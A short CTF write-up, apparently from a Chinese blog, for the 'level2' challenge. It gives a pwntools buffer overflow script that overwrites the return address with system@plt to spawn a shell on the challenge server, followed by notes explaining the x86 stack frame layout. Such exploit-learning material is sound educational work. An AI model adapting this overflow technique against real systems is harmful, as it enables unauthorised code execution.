https://blog.csdn.net/Zarcs_233/article/details/103996634

payload:
from pwn import *
context.update(arch='i386')

p = remote('111.198.29.45',30411)
e = ELF('./level2')

p.sendlineafter(':',flat(['a'*0x8c,e.plt['system'],0,0x804A024,0,0]))
p.interactive()
其中flat的含义是自动构造ROP

正常的的函数func都会有函数序言:push ebp,mov ebp,esp.
这里就会将ebp保存下来，此时的func的栈帧esp=ebp,一般都会sub esp一下抬高栈顶
而call一般会push eip(伪代码),所以此时栈帧是这样的

参数2		ebp+Ch
参数1		ebp+8h
返回地址		ebp+4h
保存的ebp	ebp+0h
局部变量1	ebp-4h
局部变量2	ebp-8h
